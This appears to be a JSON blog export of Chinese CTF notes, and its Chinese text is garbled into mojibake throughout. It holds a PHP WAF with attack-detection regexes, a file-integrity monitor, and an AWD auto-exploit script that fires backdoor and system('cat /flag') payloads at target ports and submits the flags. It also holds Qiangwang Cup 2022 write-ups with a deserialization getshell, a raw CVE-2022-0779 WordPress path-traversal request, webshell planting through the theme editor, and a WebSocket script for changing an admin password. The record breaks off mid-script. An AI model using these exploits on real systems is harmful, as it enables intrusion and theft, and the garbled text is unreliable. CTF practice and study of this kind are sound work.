&#125;\n&#125;\n\n/*\næ”»å‡»å…³é”®å­—æ£€æµ‹ï¼Œæ­¤å¤„ç”±äºä¹‹å‰å°†ç‰¹æ®Šå­—ç¬¦æ›¿æ¢æˆç©ºæ ¼ï¼Œå³ä½¿å­˜åœ¨ç»•è¿‡ç‰¹æ€§ä¹Ÿç»•ä¸è¿‡æ­£åˆ™çš„\\b\n*/\nfunction filter_attack_keyword($str)&#123;\n    if(preg_match(&quot;/select\\b|insert\\b|update\\b|drop\\b|delete\\b|dumpfile\\b|outfile\\b|load_file|rename\\b|floor\\(|extractvalue|updatexml|name_const|multipoint\\(/i&quot;, $str))&#123;\n        write_attack_log(&quot;sqli&quot;);\n    &#125;\n\n    //æ­¤å¤„æ–‡ä»¶åŒ…å«çš„æ£€æµ‹æˆ‘çœŸçš„ä¸ä¼šå†™äº†ï¼Œæ±‚é«˜äººæŒ‡ç‚¹ã€‚ã€‚ã€‚\n    if(substr_count($str,$_SERVER[&#39;PHP_SELF&#39;]) &lt; 2)&#123;\n        $tmp = str_replace($_SERVER[&#39;PHP_SELF&#39;], &quot;&quot;, $str);\n        if(preg_match(&quot;/\\.\\.|.*\\.php[35]&#123;0,1&#125;/i&quot;, $tmp))&#123; \n            write_attack_log(&quot;LFI/LFR&quot;);;\n        &#125;\n    &#125;else&#123;\n        write_attack_log(&quot;LFI/LFR&quot;);\n    &#125;\n    if(preg_match(&quot;/base64_decode|eval\\(|assert\\(/i&quot;, $str))&#123;\n        write_attack_log(&quot;EXEC&quot;);\n    &#125;\n    if(preg_match(&quot;/flag/i&quot;, $str))&#123;\n        write_attack_log(&quot;GETFLAG&quot;);\n    &#125;\n\n&#125;\n\n/*\nç®€å•å°†æ˜“å‡ºç°é—®é¢˜çš„å­—ç¬¦æ›¿æ¢æˆä¸­æ–‡\n*/\nfunction filter_dangerous_words($str)&#123;\n    $str = str_replace(&quot;&#39;&quot;, &quot;â€˜&quot;, $str);\n    $str = str_replace(&quot;\\&quot;&quot;, &quot;â€œ&quot;, $str);\n    $str = str_replace(&quot;&lt;&quot;, &quot;ã€Š&quot;, $str);\n    $str = str_replace(&quot;&gt;&quot;, &quot;ã€‹&quot;, $str);\n    return $str;\n&#125;\n\n/*\nè·å–httpçš„è¯·æ±‚åŒ…ï¼Œæ„ä¹‰åœ¨äºè·å–åˆ«äººçš„æ”»å‡»payload\n*/\nfunction get_http_raw() &#123; \n    $raw = &#39;&#39;; \n\n    $raw .= $_SERVER[&#39;REQUEST_METHOD&#39;].&#39; &#39;.$_SERVER[&#39;REQUEST_URI&#39;].&#39; &#39;.$_SERVER[&#39;SERVER_PROTOCOL&#39;].&quot;\\r\\n&quot;; \n     \n    foreach($_SERVER as $key =&gt; $value) &#123; \n        if(substr($key, 0, 5) === &#39;HTTP_&#39;) &#123; \n            $key = substr($key, 5); \n            $key = str_replace(&#39;_&#39;, &#39;-&#39;, $key); \n            $raw .= $key.&#39;: &#39;.$value.&quot;\\r\\n&quot;; \n        &#125; \n    &#125; \n    $raw .= &quot;\\r\\n&quot;; \n    $raw .= file_get_contents(&#39;php://input&#39;); \n    return $raw; \n&#125;\n\n/*\nè¿™é‡Œæ‹¦æˆªå¹¶è®°å½•æ”»å‡»payload\n*/\nfunction write_attack_log($alert)&#123;\n    $data = date(&quot;Y/m/d H:i:s&quot;).&quot; -- [&quot;.$alert.&quot;]&quot;.&quot;\\r\\n&quot;.get_http_raw().&quot;\\r\\n\\r\\n&quot;;\n    $ffff = fopen(&#39;log_is_a_secret_file.txt&#39;, &#39;a&#39;); //æ—¥å¿—è·¯å¾„ \n    fwrite($ffff, $data);  \n    fclose($ffff);\n    if($alert == &#39;GETFLAG&#39;)&#123;\n        echo &quot;HCTF&#123;aaaa&#125;&quot;; //å¦‚æœè¯·æ±‚å¸¦æœ‰flagå…³é”®å­—ï¼Œæ˜¾ç¤ºå‡çš„flagã€‚ï¼ˆ2333333ï¼‰\n    &#125;else&#123;\n        sleep(15); //æ‹¦æˆªå‰å»¶æ—¶15ç§’\n    &#125;\n    exit(0);\n&#125;\necho $_SERVER[&#39;QUERY_STRING&#39;];\n?&gt;\næ–‡ä»¶ç›‘æ§shell# -*- coding: utf-8 -*-\n#use: python file_check.py ./\n\nimport os\nimport hashlib\nimport shutil\nimport ntpath\nimport time\n\nCWD = os.getcwd()\nFILE_MD5_DICT = &#123;&#125;      # æ–‡ä»¶MD5å­—å…¸\nORIGIN_FILE_LIST = []\n\n# ç‰¹æ®Šæ–‡ä»¶è·¯å¾„å­—ç¬¦ä¸²\nSpecial_path_str = &#39;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#39;\nbakstring = &#39;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#39;\nlogstring = &#39;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;\nwebshellstring = &#39;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;\ndifffile = &#39;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#39;\n\nSpecial_string = &#39;drops_log&#39;  # å…æ­»é‡‘ç‰Œ\nUNICODE_ENCODING = &quot;utf-8&quot;\nINVALID_UNICODE_CHAR_FORMAT = r&quot;\\?%02x&quot;\n\n# æ–‡ä»¶è·¯å¾„å­—å…¸\nspec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))\nSpecial_path = &#123;\n    &#39;bak&#39; : os.path.realpath(os.path.join(spec_base_path, bakstring)),\n    &#39;log&#39; : os.path.realpath(os.path.join(spec_base_path, logstring)),\n    &#39;webshell&#39; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),\n    &#39;difffile&#39; : os.path.realpath(os.path.join(spec_base_path, difffile)),\n&#125;\n\ndef isListLike(value):\n    return isinstance(value, (list, tuple, set))\n\n# è·å–Unicodeç¼–ç \ndef getUnicode(value, encoding=None, noneToNull=False):\n\n    if noneToNull and value is None:\n        return NULL\n\n    if isListLike(value):\n        value = list(getUnicode(_, encoding, noneToNull) for _ in value)\n        return value\n\n    if isinstance(value, unicode):\n        return value\n    elif isinstance(value, basestring):\n        while True:\n            try:\n                return unicode(value, encoding or UNICODE_ENCODING)\n            except UnicodeDecodeError, ex:\n                try:\n                    return unicode(value, UNICODE_ENCODING)\n                except:\n                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]\n    else:\n        try:\n            return unicode(value)\n        except UnicodeDecodeError:\n            return unicode(str(value), errors=&quot;ignore&quot;)\n\n# ç›®å½•åˆ›å»º\ndef mkdir_p(path):\n    import errno\n    try:\n        os.makedirs(path)\n    except OSError as exc:\n        if exc.errno == errno.EEXIST and os.path.isdir(path):\n            pass\n        else: raise\n\n# è·å–å½“å‰æ‰€æœ‰æ–‡ä»¶è·¯å¾„\ndef getfilelist(cwd):\n    filelist = []\n    for root,subdirs, files in os.walk(cwd):\n        for filepath in files:\n            originalfile = os.path.join(root, filepath)\n            if Special_path_str not in originalfile:\n                filelist.append(originalfile)\n    return filelist\n\n# è®¡ç®—æœºæ–‡ä»¶MD5å€¼\ndef calcMD5(filepath):\n    try:\n        with open(filepath,&#39;rb&#39;) as f:\n            md5obj = hashlib.md5()\n            md5obj.update(f.read())\n            hash = md5obj.hexdigest()\n            return hash\n    except Exception, e:\n        print u&#39;[!] getmd5_error : &#39; + getUnicode(filepath)\n        print getUnicode(e)\n        try:\n            ORIGIN_FILE_LIST.remove(filepath)\n            FILE_MD5_DICT.pop(filepath, None)\n        except KeyError, e:\n            pass\n\n# è·å–æ‰€æœ‰æ–‡ä»¶MD5\ndef getfilemd5dict(filelist = []):\n    filemd5dict = &#123;&#125;\n    for ori_file in filelist:\n        if Special_path_str not in ori_file:\n            md5 = calcMD5(os.path.realpath(ori_file))\n            if md5:\n                filemd5dict[ori_file] = md5\n    return filemd5dict\n\n# å¤‡ä»½æ‰€æœ‰æ–‡ä»¶\ndef backup_file(filelist=[]):\n    # if len(os.listdir(Special_path[&#39;bak&#39;])) == 0:\n    for filepath in filelist:\n        if Special_path_str not in filepath:\n            shutil.copy2(filepath, Special_path[&#39;bak&#39;])\n\nif __name__ == &#39;__main__&#39;:\n    print u&#39;---------start------------&#39;\n    for value in Special_path:\n        mkdir_p(Special_path[value])\n    # è·å–æ‰€æœ‰æ–‡ä»¶è·¯å¾„ï¼Œå¹¶è·å–æ‰€æœ‰æ–‡ä»¶çš„MD5ï¼ŒåŒæ—¶å¤‡ä»½æ‰€æœ‰æ–‡ä»¶\n    ORIGIN_FILE_LIST = getfilelist(CWD)\n    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)\n    backup_file(ORIGIN_FILE_LIST) # TODO å¤‡ä»½æ–‡ä»¶å¯èƒ½ä¼šäº§ç”Ÿé‡åBUG\n    print u&#39;[*] pre work end!&#39;\n    while True:\n        file_list = getfilelist(CWD)\n        # ç§»é™¤æ–°ä¸Šä¼ æ–‡ä»¶\n        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))\n        if len(diff_file_list) != 0:\n            # import pdb;pdb.set_trace()\n            for filepath in diff_file_list:\n                try:\n                    f = open(filepath, &#39;r&#39;).read()\n                except Exception, e:\n                    break\n                if Special_string not in f:\n                    try:\n                        print u&#39;[*] webshell find : &#39; + getUnicode(filepath)\n                        shutil.move(filepath, os.path.join(Special_path[&#39;webshell&#39;], ntpath.basename(filepath) + &#39;.txt&#39;))\n                    except Exception as e:\n                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filepath)\n                    try:\n                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)\n                        f.write(&#39;newfile: &#39; + getUnicode(filepath) + &#39; : &#39; + str(time.ctime()) + &#39;\\n&#39;)\n                        f.close()\n                    except Exception as e:\n                        print u&#39;[-] log error : file move error: &#39; + getUnicode(e)\n\n        # é˜²æ­¢ä»»æ„æ–‡ä»¶è¢«ä¿®æ”¹,è¿˜åŸè¢«ä¿®æ”¹æ–‡ä»¶\n        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)\n        for filekey in md5_dict:\n            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:\n                try:\n                    f = open(filekey, &#39;r&#39;).read()\n                except Exception, e:\n                    break\n                if Special_string not in f:\n                    try:\n                        print u&#39;[*] file had be change : &#39; + getUnicode(filekey)\n                        shutil.move(filekey, os.path.join(Special_path[&#39;difffile&#39;], ntpath.basename(filekey) + &#39;.txt&#39;))\n                        shutil.move(os.path.join(Special_path[&#39;bak&#39;], ntpath.basename(filekey)), filekey)\n                    except Exception as e:\n                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filekey)\n                    try:\n                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)\n                        f.write(&#39;diff_file: &#39; + getUnicode(filekey) + &#39; : &#39; + getUnicode(time.ctime()) + &#39;\\n&#39;)\n                        f.close()\n                    except Exception as e:\n                        print u&#39;[-] log error : done_diff: &#39; + getUnicode(filekey)\n                        pass\n        time.sleep(2)\n        # print &#39;[*] &#39; + getUnicode(time.ctime())è‡ªåŠ¨æäº¤flagshellimport re\nimport requests\nimport json\nimport time\n\nhost = &quot;http://120.26.140.18:8000&quot;\ntarget_host = &quot;http://120.26.140.18:%d&quot;\nsubmit_url = &quot;http://120.26.140.18:8000/api/v1/challenges/attempt&quot;\nid = 4\n\nusername = &quot;Team2&quot;\npassword = &quot;adminadmin&quot;\nsession = requests.Session()\n\n\ntargets = [\n    11515, 11981, 11349, 11982, 11316, 11160\n]\n\n# æå– flag\ndef regexp_out(data):\n    patterns = [\n        re.compile(r&#39;(flag&#123;.*?&#125;)&#39;),\n        re.compile(r&#39;xnuca&#123;(.*?)&#125;&#39;),\n        re.compile(r&#39;DASCTF&#123;(.*?)&#125;&#39;),\n        re.compile(r&#39;WMCTF&#123;.*?&#125;&#39;),\n        re.compile(r&#39;[0-9a-zA-Z]&#123;8&#125;-[0-9a-zA-Z]&#123;3&#125;-[0-9a-zA-Z]&#123;5&#125;&#39;),\n    ]\n\n    for pattern in patterns:\n        res = pattern.findall(data.decode() if isinstance(data, bytes) else data)\n        if len(res) &gt; 0:\n            return str(res[0])\n\n    return None\n\n# æäº¤å‡½æ•°\ndef submit(target_url, flag):\n    data = &#123;\n        &quot;challenge_id&quot;: str(id),\n        &quot;submission&quot;: flag,\n    &#125;\n\n    r = session.post(submit_url, json=data, allow_redirects=False)\n    response = json.loads(r.text)\n    print(&quot;target: %s - %s - %s \\n&quot; % (target_url, flag, response[&#39;data&#39;][&#39;message&#39;]))\n    if response[&#39;data&#39;][&#39;message&#39;] == &#39;Correct&#39; or response[&#39;data&#39;][&#39;message&#39;] == &#39;Do not submit again :(&#39;:\n        return True\n    else:\n        return False\n\n# ç™»å½•å¹³å°\ndef login():\n    login_url = f&quot;&#123;host&#125;/login&quot;\n    r = session.get(login_url)\n    nonce = re.findall(r&#39;var csrf_nonce = &quot;([0-9a-f]&#123;64&#125;)&quot;;&#39;, r.text)[0]\n    r.close()\n    data = &#123;\n        &quot;name&quot;: username,\n        &quot;password&quot;: password,\n        &quot;nonce&quot;: nonce\n    &#125;\n\n    r = session.post(login_url, data=data, allow_redirects=False)\n    text = r.text\n    status_code = r.status_code\n    r.close()\n\n\n    if &#39;Your username or password is incorrect&#39; not in text and status_code == 302:\n        # è·å–å¹³å°çš„ CSRF ä»¤ç‰Œ\n        r = session.get(f&quot;&#123;host&#125;/challenges&quot;)\n        nonce = re.findall(r&#39;var csrf_nonce = &quot;([0-9a-f]&#123;64&#125;)&quot;;&#39;, r.text)[0]\n        r.close()\n        session.headers[&#39;CSRF-Token&#39;] = nonce\n        print(&quot;Login Success!&quot;)\n        return True\n\n    print(&quot;Login Failed!&quot;)\n    return False\n\ndef pwn1(target_url):\n    r = requests.get(f&quot;&#123;target_url&#125;/backdoor.php&quot;, params=&#123;&#39;file&#39;: &#39;/flag&#39;&#125;, allow_redirects=False)\n    text = r.text\n    r.close()\n    return submit(target_url, regexp_out(text))\n\ndef pwn2(target_url):\n    r = requests.get(f&quot;&#123;target_url&#125;/admin/views/update.php;&quot;, params=&#123;&#39;a&#39;: &quot;system(&#39;cat /flag&#39;)&quot;&#125;, allow_redirects=False)\n    text = r.text\n    r.close()\n    return submit(target_url, regexp_out(text))\n\ndef main():\n    # ç™»å½•å¹³å°\n    if not login(): return\n\n    while True:\n        for target_port in targets:\n            target_url = target_host % target_port\n            # éå†ä¸åŒçš„ payload\n            if pwn1(target_url): continue\n            if pwn2(target_url): continue\n        # 120ç§’è·‘ä¸€æ¬¡ auto exp\n        time.sleep(120)\n\n\nif __name__ == &#39;__main__&#39;:\n    main()","slug":"AWD","date":"2022-11-14T14:34:21.000Z","categories_index":"AWD","tags_index":"AWD","author_index":"xmmlaz"},{"id":"a6ba9e79ebbec5d852da03b23e7284e1","title":"å¼ºç½‘æ¯2022","content":"å¼ºç½‘å…ˆé”‹farcefileæ‰«æåˆ° www.zip ï¼Œé€šè¿‡æµ‹è¯•å‘ç°\n\næ£€æŸ¥åç¼€å’Œ content-type ï¼Œæ–‡ä»¶åæ˜¯éšæœºå­—ç¬¦ä¸²\næ•°æ®å­˜å‚¨äº cookie ä¸­ï¼Œé€šè¿‡ ååºåˆ—åŒ–å‡½æ•°  è¿˜åŸå¹¶æ˜¾ç¤ºå…³é”®ç‚¹åœ¨äº config.inc.php æ–‡ä»¶ä¸­çš„ spl_autoload_register() å‡½æ•°\n\nphp&lt;?php\nspl_autoload_register();\nerror_reporting(0);\n\nfunction e($str)&#123;\n    return htmlspecialchars($str);\n&#125;\n$userfile = empty($_COOKIE[&quot;userfile&quot;]) ? [] : unserialize($_COOKIE[&quot;userfile&quot;]);\n?&gt;\n&lt;p&gt;\n    &lt;a href=&quot;/index.php&quot;&gt;Index&lt;/a&gt;\n    &lt;a href=&quot;/showfile.php&quot;&gt;files&lt;/a&gt;\n&lt;/p&gt;spl_autoload_register()å¦‚æœä¸æŒ‡å®šå¤„ç†ç”¨çš„å‡½æ•°ï¼Œå°±ä¼šè‡ªåŠ¨åŒ…å« ç±»å.php æˆ– ç±»å.inc çš„æ–‡ä»¶ï¼Œå¹¶åŠ è½½å…¶ä¸­çš„ ç±»å ç±»é€šè¿‡æºç çœ‹åˆ°é»‘åå•ä¸­æ²¡æœ‰ .inc ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ .inc æ–‡ä»¶æ¥å®ç°Getshell \nphp$blackext = [&quot;php&quot;, &quot;php5&quot;, &quot;php3&quot;, &quot;html&quot;, &quot;swf&quot;, &quot;htm&quot;,&quot;phtml&quot;];æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šä¼ åï¼Œå“åº”åŒ…é‡Œå‡ºç°äº†ä¸€æ®µ userfile çš„ cookie\nshellSet-Cookie: userfile=a:1:&#123;i:0;s:36:&quot;340d9b3c0f5d7eff1c077d2ecd8c1c19.inc&quot;;&#125;\nç„¶åæˆ‘ä»¬åºåˆ—åŒ–ä¸€ä¸ªç±»åä¸º 340d9b3c0f5d7eff1c077d2ecd8c1c19 çš„å¯¹è±¡ \nphp&lt;?php \nclass 340d9b3c0f5d7eff1c077d2ecd8c1c19&#123;\n&#125;\n\n$flag = new 340d9b3c0f5d7eff1c077d2ecd8c1c19();\necho serialize($flag);\n// O:32:&quot;340d9b3c0f5d7eff1c077d2ecd8c1c19&quot;:0:&#123;&#125;ç›´æ¥åœ¨ c``ookie ä¸­æ·»åŠ æˆ‘ä»¬æ–°ç”Ÿæˆçš„ ååºåˆ—åŒ– å­—ç¬¦ä¸²å³å¯\nWP_UMè®¿é—®ç¯å¢ƒï¼Œå‡ºç°ä¸€ä¸ªå¼•å¯¼å®‰è£…é¡µé¢ï¼Œæ„Ÿè§‰æœ‰ç”¨çš„ä¿¡æ¯å°±æ˜¯ä¸‹é¢è¿™æ®µ\n\n\n\n\n\n\n\n\n\nçŒ«å“¥æœ€è¿‘ç”¨wordpressæ­å»ºäº†ä¸€ä¸ªä¸ªäººåšå®¢ï¼Œç²—å¿ƒçš„çŒ«å“¥å› ä¸ºè®°æ€§å·®ï¼Œæ‰€ä»¥æŠŠç®¡ç†å‘˜10ä½çš„è´¦å·ä½œä¸ºæ–‡ä»¶åæ”¾åœ¨&#x2F;usernameä¸‹å’Œ15ä½çš„å¯†ç ä½œä¸ºæ–‡ä»¶åæ”¾åœ¨&#x2F;passwordä¸‹ã€‚å¹¶ä¸”å­˜æ”¾çš„æ—¶å€™çŒ«å“¥åˆ†æˆä¸€ä¸ªæ•°å­—(ä½œä¸ºå­—æ¯åœ¨å¯†ç ä¸­çš„é¡ºåº)ï¼‹ä¸€ä¸ªå¤§å†™æˆ–å°å†™å­—æ¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä¾‹å¦‚adminåˆ†æˆ5ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶åæ˜¯1a 2d 3m 4i 5nè¿™å‡ å¤©ä»–å‘ç°äº†ä¸€ä¸ªç‰¹åˆ«å¥½ç”¨çš„wordpressæ’ä»¶ï¼Œåœ¨ä»–å¼€å¿ƒçš„æ—¶å€™ï¼Œå¯æ˜¯å€’éœ‰çš„çŒ«å“¥å´ä¸çŸ¥é“å±é™©çš„å­˜åœ¨ã€‚è¿™æ®µä¿¡æ¯è¯´æ’ä»¶æœ‰é—®é¢˜ï¼Œç„¶åé¢˜ç›®é™„ä»¶é‡Œå‘ç°å°±ä¿©æ’ä»¶ akismet å’Œ user-meta \næ ¹æ® user-meta æ’ä»¶çš„ç‰ˆæœ¬ 2.4.3 æœåˆ°äº†ä¸€ä¸ªè·¯å¾„éå†æ¼æ´ CVE-2022-0779ï¼Œæ­£å¥½å¯ä»¥ç»„åˆèµ·æ¥å¾—åˆ°è´¦å·å¯†ç ã€‚\nè¯·æ±‚åŒ…é‡Œçš„ pf_noncee éœ€è¦æ”¹æˆå½“å‰ pf_noncee ï¼Œè·å–æ–¹æ³•ï¼šåœ¨ç½‘ç«™é¦–é¡µæŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œæœç´¢ pf_nonce å³å¯\nhttpPOST /wp-admin/admin-ajax.php HTTP/1.1\nHost: eci-2ze2ahooasrbklrp7npz.cloudeci1.ichunqiu.com\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 159\n\nfield_name=test&amp;filepath=/../../../../../../../../username/1M&amp;field_id=um_field_4&amp;form_key=Upload&amp;action=um_show_uploaded_file&amp;pf_nonce=e74a0c7bd4&amp;is_ajax=trueæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå¦‚æœè·¯å¾„å­˜åœ¨é‚£ä¹ˆä¼šæœ‰ä¸€ä¸ª Remove åä¹‹æ²¡æœ‰\nè´¦å·( 10 ä½)å¯†ç ( 15 ä½)ï¼Œè¿™äº›ä¿¡æ¯é¢˜ç›®æéƒ½æåˆ°äº†ï¼Œæˆ‘ä»¬ç›´æ¥ burp çˆ†ç ´ a-z , A-Z å³å¯ï¼Œå¦å¤–åšå®¢æ–‡ç« å†…æ³„éœ²äº†ç”¨æˆ·åï¼ŒåŒæ—¶çˆ†ç ´çš„æ—¶å€™å‘ç°ç¬¬ä¸€ä½æ˜¯ M ç®€å•çŒœæµ‹äº†å‡ ä½ï¼Œæ‰€ä»¥è¯´å®é™…ä¸Šåªçˆ†ç ´äº†å¯†ç çš„ç¬¬ 6 ä½åˆ°ç¬¬ 15 ä½ï¼Œè¿˜æ˜¯æŒºå¿«çš„ã€‚\nshellç”¨æˆ·åï¼šMaoGePaMao\nå¯†ç ï¼šMaoGeYaoQiFeiLaç™»å½•åå°ï¼Œå¤–è§‚ -&gt; ä¸»é¢˜æ–‡ä»¶ç¼–è¾‘å™¨ å¤„å†™shell (æœ¬æ„æ˜¯ç›´æ¥å†™ä¸€å¥è¯ï¼Œä½†æ˜¯å¥½åƒè¿‡æ»¤äº†å¼•å·)ï¼Œç›´æ¥å†™ä¸ªä¸€å¥è¯åˆ°å…¶ä»–æ–‡ä»¶å§)\nä»–è¯´ flag è—èµ·æ¥äº†ï¼Œè¿ä¸Šèšå‰‘ç¿»äº†åŠå¤©ï¼Œæœ€åå‘ç°åœ¨ /usr/local/This_1s_secert \n\nASRä¸‹è½½é™„ä»¶å¾—åˆ°ä¸€ä¸ª python è„šæœ¬\npythonfrom Crypto.Util.number import getPrime\nfrom secret import falg\npad = lambda s:s + bytes([(len(s)-1)%16+1]*((len(s)-1)%16+1))\nâ€‹\nn = getPrime(128)**2 * getPrime(128)**2 * getPrime(128)**2 * getPrime(128)**2\ne = 3\nâ€‹\nflag = pad(flag)\nprint(flag)\nassert(len(flag) &gt;= 48)\nm = int.from_bytes(flag,&#39;big&#39;)\nc = pow(m,e,n)\nâ€‹\nprint(f&#39;n = &#123;n&#125;&#39;)\nprint(f&#39;e = &#123;e&#125;&#39;)\nprint(f&#39;c = &#123;c&#125;&#39;)\nâ€‹\n&#39;&#39;&#39;\nn = 8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001\ne = 3\nc = 945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149\n&#39;&#39;&#39;æˆ‘ä»¬å…ˆç”¨ factordb æŠŠ n åˆ†è§£ä¸€ä¸‹ï¼Œå¾—åˆ°\nshellp1 = 218566259296037866647273372633238739089\np2 = 223213222467584072959434495118689164399\np3 = 225933944608558304529179430753170813347\np4 = 260594583349478633632570848336184053653 e|p1-1|p3-1ï¼Œéœ€è¦ä»£æ›¿ï¼Œè¿›è¡Œä¸€äº›å°è¯•å¾—å‡º n ä¹Ÿå¯ä»¥è¿‘ä¼¼ç­‰äº p2**2*p4**2\npythonimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\nâ€‹\nn = 8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001\ne = 3\nc = 945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149\nâ€‹\np1 = 218566259296037866647273372633238739089\np2 = 223213222467584072959434495118689164399\np3 = 225933944608558304529179430753170813347\np4 = 260594583349478633632570848336184053653\nâ€‹\nassert(n==(p1*p2*p3*p4)**2)\ndata = gmpy2.invert(e, (p2-1)*p2*p4*(p4-1))\nprint(long_to_bytes(pow(c, data, p2**2*p4**2)))\nâ€‹\n# flag&#123;Fear_can_hold_you_prisoner_Hope_can_set_you_free&#125;polydivç¬¬ä¸€æ­¥è€ƒå¯Ÿpwnçš„ä½¿ç”¨èµ·åˆ°äº¤äº’ä½œç”¨ï¼Œç¬¬äºŒæ­¥åœ¨æ•´æ•°ç¯ä¸­çš„å¤šé¡¹å¼ä¹˜é™¤æ³•ä½¿ç”¨sagemathæ±‚è§£ï¼Œå¾—åˆ°æ•°æ®å¹¶è¿›è¡Œ40è½®çˆ†ç ´æ±‚è§£\npythonimport string\nfrom hashlib import *\nfrom pwn import *\nimport itertools\nfrom sage.all import *\nstrs = string.ascii_letters + string.digits\nPR = PolynomialRing(Zmod(2),name=&#39;x&#39;)\nx = PR.gen()\n\ndef proof(end,sha):\nÂ  Â  num=4\nÂ  Â  slist=itertools.permutations(strs,int(num))\nÂ  Â  for i in slist:\nÂ  Â  Â  Â  i=&#39;&#39;.join(i)\nÂ  Â  Â  Â  if sha256((i+end.decode()).encode()).hexdigest()==sha.decode():\nÂ  Â  Â  Â  Â  Â  return i\n\ndef poly(s):\nÂ  Â  fx = 0\nÂ  Â  if s[-1] ==&#39;1&#39;:\nÂ  Â  Â  Â  fx=1\nÂ  Â  if &#39;x&#39; in s.replace(&#39;x^&#39;,&#39;&#39;):\nÂ  Â  Â  Â  fx+=x\nÂ  Â  for i in range(2,15):\nÂ  Â  Â  Â  if str(i) in s:\nÂ  Â  Â  Â  Â  Â  fx+=x^i\nÂ  Â  return fx\n\nio=remote(&#39;39.107.137.85&#39; ,41366)\ncontext.log_level=&#39;debug&#39;\nio.recvuntil(&#39;sha256(XXXX+&#39;)\nmessage=io.recvuntil(&#39;\\n&#39;)[:-1]\nend=message[:16]\nSHA=message[-64:]\nxxxx=proof(end,SHA)\nio.sendafter(&#39;Give me XXXX: &#39;,xxxx)\n\nfor i in range(40):\nÂ  Â  io.recvuntil(&#39;r(x) = &#39;)\nÂ  Â  rx = poly(io.recvuntil(&#39;\\n&#39;)[:-1].decode())\nÂ  Â  io.recvuntil(&#39;a(x) = &#39;)\nÂ  Â  ax = poly(io.recvuntil(&#39;\\n&#39;)[:-1].decode())\nÂ  Â  io.recvuntil(&#39;c(x) = &#39;)\nÂ  Â  cx = poly(io.recvuntil(&#39;\\n&#39;)[:-1].decode())\nÂ  Â  bx = (rx-cx)//ax\nÂ  Â  print(rx,ax,bx)\nÂ  Â  io.sendafter(&#39;&gt; b(x) = &#39;,str(bx))\nio.recvall()\nWebbabywebéšæ‰‹æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•åï¼Œæ ¹æ®æç¤ºå‘é€ help ï¼Œè¿”å›å¦‚ä¸‹ä¿¡æ¯\n\nä¸€å¼€å§‹çœ‹åˆ° bugreport å‘½ä»¤ï¼ˆå‘é€ bugreport ç½‘å€  ç®¡ç†å‘˜ä¼šå»è¯·æ±‚ä½ å‘é€çš„ç½‘å€ï¼‰ï¼Œè§‰å¾—åº”è¯¥æ˜¯ XSS é’“ç®¡ç†å‘˜çš„ cookieï¼Œä½†æ˜¯ä¸€ç›´æ²¡æˆåŠŸã€‚æ¥æ”¶ä¸åˆ°è¯·æ±‚ã€‚\nåæ¥è€ƒè™‘åˆ°åˆ©ç”¨ bugreport å’Œ changepw åŠŸèƒ½ä¿®æ”¹ç®¡ç†å‘˜å¯†ç  ï¼Œæ ¹æ®é¡µé¢ä¸­çš„ js ï¼Œç®€å•æ„é€  ws çš„è¯·æ±‚ï¼Œä¸Šä¼ åˆ°è‡ªå·±çš„æœåŠ¡å™¨ï¼Œ è¯•äº†åŠå¤©è¿˜æ˜¯ä¸è¡Œï¼Œæœ€åè€ƒè™‘åˆ°ä¸å‡ºç½‘ï¼Œé¢˜ç›®æè¿°é‡Œç»™äº† docker å®¹å™¨æ˜ å°„çš„ç«¯å£ï¼Œæ‰€ä»¥è„šæœ¬é‡Œçš„ ws åœ°å€æ”¹ä¸º ws://127.0.0.1:8888\nbashdocker run -dit -p &quot;0.0.0.0:pub_port:8888&quot; babyweb\nshell&lt;meta charset=&quot;utfâ€8&quot; /&gt;\n&lt;script&gt;\nvar ws = null;\nvar url = &quot;ws://127.0.0.1:8888/bot&quot;;\n\nws = new 